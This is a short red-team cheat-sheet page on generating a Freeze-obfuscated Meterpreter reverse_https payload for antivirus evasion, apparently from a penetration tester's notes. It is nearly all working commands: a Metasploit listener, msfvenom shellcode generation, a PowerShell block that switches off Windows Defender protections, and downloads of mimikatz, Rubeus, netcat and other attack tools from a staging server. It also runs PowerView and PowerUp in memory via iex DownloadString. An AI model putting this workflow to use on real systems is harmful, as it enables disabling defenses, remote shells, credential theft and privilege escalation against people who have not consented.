---
title: "Freeze"
---

# Freeze

Obfuscated Meterpreter payload generation using [Freeze](https://github.com/optiv/Freeze) for AV evasion. Freeze recompiles shellcode into a Go binary with in-memory obfuscation techniques, bypassing signature-based detection. The PowerShell block disables Defender and downloads the toolset from a staging server.

```shell
# Start listener
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST eth1; set LPORT 443; exploit"

# Generate raw payload and obfuscate with Freeze
output=cehb_met.exe
cd /home/kali/exp/tools/Freeze
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth1 LPORT=443 EXITFUNC=thread -f raw -o rev.raw
./Freeze -I rev.raw -encrypt -O $output
mv $output ~/exp/eme/
cd ~/exp/eme/
ls -lah $output
```

```powershell
# Disable Defender and download toolset
$ip = "192.168.200.2"
$port = 80

Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableEmailScanning $true
Set-MpPreference -DisableScriptScanning $true
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

function Download-IfNotExists { param ([string]$url, [string]$output) if (-not (Test-Path $output)) { wget -UseBasicParsing $url -OutFile $output } else { Write-Host "$output already exists, skipping download." } }

Download-IfNotExists "http://${ip}:${port}/mimikatz.exe" "mimikatz.exe"
Download-IfNotExists "http://${ip}:${port}/rubeus.exe" "rubeus.exe"
Download-IfNotExists "http://${ip}:${port}/nc64.exe" "nc64.exe"
Download-IfNotExists "http://${ip}:${port}/printspoofer64.exe" "printspoofer64.exe"
Download-IfNotExists "http://${ip}:${port}/sharphound.exe" "sharphound.exe"
Download-IfNotExists "http://${ip}:${port}/spoolsample.exe" "spoolsample.exe"
Download-IfNotExists "http://${ip}:${port}/mimidrv.sys" "mimidrv.sys"
Download-IfNotExists "http://${ip}:${port}/cehb.exe" "cehb.exe"

iex (New-Object Net.Webclient).DownloadString("http://${ip}:${port}/powerview.ps1")
iex (New-Object Net.Webclient).DownloadString("http://${ip}:${port}/powermad.ps1")
iex (New-Object Net.Webclient).DownloadString("http://${ip}:${port}/powerup.ps1")
iex (New-Object Net.Webclient).DownloadString("http://${ip}:${port}/powerupsql.ps1")
```
